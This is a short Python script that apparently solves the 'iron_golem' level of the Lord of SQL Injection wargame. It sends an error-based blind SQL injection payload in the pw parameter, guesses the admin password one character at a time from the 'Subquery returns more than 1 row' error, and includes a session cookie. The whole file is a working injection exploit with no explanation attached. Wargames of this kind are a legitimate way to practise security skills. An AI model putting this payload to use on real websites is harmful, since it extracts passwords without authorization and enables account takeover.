import requests

pw = ""

for order in range(0,32):
    for p in range(ord('0'), ord('z')):
        url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php?pw=' or id = 'admin' and if(ord(substr(pw,"+str(order+1)+",1))="+str(p)+",(select 1 union select 2), 1)%23 "
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if 'Subquery returns more than 1 row' in res.text:
            pw = pw +chr(p)
            print(pw)
print(pw)
